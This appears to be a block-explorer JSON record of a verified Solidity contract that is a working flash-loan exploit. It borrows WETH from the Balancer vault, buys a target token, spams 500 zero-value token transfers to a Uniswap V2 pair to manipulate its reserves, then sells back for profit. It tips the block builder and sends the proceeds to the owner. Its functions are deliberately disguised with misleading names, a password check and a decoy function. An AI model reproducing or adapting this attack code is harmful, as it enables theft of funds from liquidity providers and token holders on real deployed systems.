{
  "TxHash": "0x7769ac7962936828eddfe7e32c80974f399c5135797b3941b01261ab48e09f0f",
  "ContractAddress": "0xee88bf1c1c5ad00a300df14c7da936638f051362",
  "Name": "rebase",
  "PackageStatus": 0,
  "status": "1",
  "message": "OK",
  "result": [
    {
      "SourceCode": "// SPDX-License-Identifier: UNLICENSED\r\npragma solidity 0.8.25;\r\n\r\ninterface IERC20{\r\n    function decimals() external pure returns (uint8);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address owner) external view returns (uint256);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint value) external returns (bool);\r\n    function transfer(address to, uint value) external returns (bool);\r\n    function transferFrom(address from, address to, uint value) external returns (bool);\r\n    function deposit() external payable;\r\n    function withdraw(uint wad) external;\r\n    function burn(uint amount) external returns(bool);\r\n    function mint(uint256 amount) external returns (bool );\r\n}\r\n\r\ninterface IUniswapV2Router{\r\n    function swapExactTokensForTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n\r\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\r\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\r\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\r\n}\r\n\r\ninterface IUniswapV2Pair{\r\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\r\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\r\n    function sync() external;\r\n}\r\n\r\ninterface IRebase{\r\n    function swapAndTrans() external;\r\n    function divideFunds() external;\r\n    function _maxWalletToken() external view returns(uint);\r\n}\r\n\r\ninterface IBal{\r\n    function flashLoan(\r\n        address recipient,\r\n        address[] memory tokens,\r\n        uint256[] memory amounts,\r\n        bytes memory userData\r\n    ) external ;\r\n}\r\n\r\ncontract rebase{\r\n    address private constant MonTokeN=0x9bD725c8B77bA0A869a567da46B43A9Db8dB4ca4;\r\n    address private constant WETH=0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;    \r\n    address private constant vault=0xBA12222222228d8Ba445958a75a0704d566BF2C8;\r\n    address private constant router=0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n    address private constant pair=0x5b431e0F7fe1A38B040712Bf5D47922A50F43EBD;\r\n    \r\n    address immutable owNer;\r\n    uint private passWD=0;\r\n\r\n    rebaseHelper rbhp1;\r\n    rebaseHelper rbhp2;\r\n    rebaseHelper rbhp3;\r\n\r\n    constructor(){\r\n        owNer=msg.sender;\r\n        passWD+=1;\r\n    }\r\n\r\n    modifier OnLyOWner(){\r\n        require(msg.sender == owNer,\"not oner\");\r\n        _;\r\n    }\r\n\r\n    function TodayIsSaturDayFirst(uint _pawd) public OnLyOWner(){\r\n        require(_pawd == passWD,\"wrong\");\r\n        NeedMonEyFroMBalFir();\r\n        \r\n        uint profit=IERC20(WETH).balanceOf(address(this));\r\n        IERC20(WETH).withdraw(profit);\r\n        if(profit\u003e1e17){\r\n            payable(block.coinbase).transfer(1e17);\r\n        }\r\n        payable(owNer).transfer(address(this).balance);\r\n        \r\n    }\r\n\r\n    function TodayIsSaturDaySecond(uint _pawd) public OnLyOWner(){\r\n        NeedMonEyFroMBalSec();\r\n        require(_pawd == passWD,\"wrong\");\r\n        uint profit=IERC20(WETH).balanceOf(address(this));\r\n        IERC20(WETH).withdraw(profit);\r\n        if(profit\u003e1e17){\r\n            payable(block.coinbase).transfer(1e17);\r\n        }\r\n        payable(owNer).transfer(address(this).balance);\r\n        \r\n        \r\n    }\r\n\r\n    function NeedMonEyFroMBalFir() internal{\r\n        address[] memory tokens=new address[](1);\r\n        tokens[0]=WETH;\r\n        uint256[] memory amounts=new uint256[](1);\r\n        amounts[0]=5 ether;\r\n        bytes memory choice=abi.encode(1);\r\n        IBal(vault).flashLoan(address(this), tokens, amounts, choice);\r\n    }\r\n\r\n    function NeedMonEyFroMBalSec() internal{\r\n        address[] memory tokens=new address[](1);\r\n        tokens[0]=WETH;\r\n        uint256[] memory amounts=new uint256[](1);\r\n        amounts[0]=5 ether;\r\n        bytes memory choice=abi.encode(2);\r\n        IBal(vault).flashLoan(address(this), tokens, amounts, choice);\r\n    }\r\n\r\n\r\n    function receiveFlashLoan(IERC20[] memory tokens, uint256[] memory amounts,uint256[] memory feeAmounts,bytes memory userData) external{\r\n        require(msg.sender == vault,\"caller wrong\");\r\n        uint choice=abi.decode(userData,(uint));\r\n        \r\n        if (choice ==1){\r\n            rbhp1=new rebaseHelper();\r\n            IERC20(WETH).transfer(address(rbhp1), 2 ether);\r\n            rebaseHelper(rbhp1).swapTokenFir();\r\n\r\n            rbhp2=new rebaseHelper();\r\n            IERC20(WETH).transfer(address(rbhp2), 2 ether);\r\n            rebaseHelper(rbhp2).swapTokenFir();\r\n            \r\n        }if (choice == 2){\r\n            rbhp3=new rebaseHelper();\r\n            IERC20(WETH).transfer(address(rbhp3), 2 ether);\r\n            rebaseHelper(rbhp3).swapTokenSec();\r\n        }\r\n        \r\n        for(uint i=0;i\u003c500;i++){\r\n            IERC20(MonTokeN).transfer(pair, 0);\r\n        }\r\n\r\n        if(choice == 1){\r\n            rebaseHelper(rbhp1).swapWeth();\r\n            rebaseHelper(rbhp2).swapWeth();\r\n        }if(choice ==2){\r\n            rebaseHelper(rbhp3).swapWeth();\r\n        }\r\n        \r\n        IERC20(WETH).transfer(vault, amounts[0]);\r\n    }\r\n\r\n    function ReCueToKEn(address _token,uint _value) public OnLyOWner(){\r\n        IERC20(_token).transfer(owNer, _value);\r\n    }\r\n\r\n    function WiTHDrawEth(address _to) public OnLyOWner(){\r\n        payable(_to).transfer(address(this).balance);\r\n    }\r\n\r\n    function ObacsFunc(uint _pawd) public OnLyOWner(){\r\n        passWD-=_pawd;\r\n    }\r\n\r\n    function receiveFlashLoan(uint _pawd) public OnLyOWner(){\r\n        passWD+=_pawd;\r\n    }\r\n\r\n    fallback() external  payable {}\r\n}\r\n\r\n\r\ncontract rebaseHelper{\r\n    address private constant MonTokeN=0x9bD725c8B77bA0A869a567da46B43A9Db8dB4ca4;\r\n    address private constant WETH=0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;    \r\n    address private constant router=0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n    address private constant pair=0x5b431e0F7fe1A38B040712Bf5D47922A50F43EBD;\r\n    address immutable owNer;\r\n    constructor(){\r\n        owNer=msg.sender;\r\n    }\r\n\r\n    modifier OnLyOWner(){\r\n        require(msg.sender == owNer,\"not oner\");\r\n        _;\r\n    }\r\n\r\n    function swapTokenFir() public OnLyOWner(){\r\n        \r\n        (uint r0,uint r1,)=IUniswapV2Pair(pair).getReserves();\r\n        uint wethneed=IUniswapV2Router(router).getAmountIn(21_0000 ether, r1, r0);\r\n        IERC20(WETH).transfer(pair, wethneed);\r\n        IUniswapV2Pair(pair).swap(21_0000 ether, 0, address(this), \"\");\r\n    }\r\n\r\n    function swapTokenSec() public OnLyOWner(){\r\n        uint bal=IERC20(WETH).balanceOf(address(this));\r\n        IERC20(WETH).approve(router, type(uint).max);\r\n        address[] memory path=new address[](2);\r\n        path[0]=WETH;\r\n        path[1]=MonTokeN;\r\n        IUniswapV2Router(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(bal, 1, path, address(this), block.timestamp);\r\n    }\r\n\r\n    function swapWeth() public OnLyOWner(){\r\n        uint balr=IERC20(MonTokeN).balanceOf(address(this))*99/100;\r\n        IERC20(MonTokeN).approve(router, type(uint).max);\r\n        address[] memory pathr=new address[](2);\r\n        pathr[0]=MonTokeN;\r\n        pathr[1]=WETH;\r\n        IUniswapV2Router(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(balr, 1, pathr, address(this), block.timestamp);\r\n\r\n        uint bal=IERC20(WETH).balanceOf(address(this));\r\n        IERC20(WETH).transfer(msg.sender, bal);\r\n    }\r\n\r\n}",
      "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_pawd\",\"type\":\"uint256\"}],\"name\":\"ObacsFunc\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_token\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"ReCueToKEn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_pawd\",\"type\":\"uint256\"}],\"name\":\"TodayIsSaturDayFirst\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_pawd\",\"type\":\"uint256\"}],\"name\":\"TodayIsSaturDaySecond\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"}],\"name\":\"WiTHDrawEth\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_pawd\",\"type\":\"uint256\"}],\"name\":\"receiveFlashLoan\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"contract IERC20[]\",\"name\":\"tokens\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"amounts\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"feeAmounts\",\"type\":\"uint256[]\"},{\"internalType\":\"bytes\",\"name\":\"userData\",\"type\":\"bytes\"}],\"name\":\"receiveFlashLoan\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]",
      "ContractName": "rebase",
      "CompilerVersion": "v0.8.25+commit.b61c2a91",
      "OptimizationUsed": "0",
      "Runs": "200",
      "ConstructorArguments": "",
      "EVMVersion": "Default",
      "Library": "",
      "LicenseType": "Unlicense",
      "Proxy": "0",
      "Implementation": "",
      "SwarmSource": "ipfs://d7704ed92567f1825925c5894c6ca3714d6a5dcf9721566c41a1436fa49dc615"
    }
  ]
}
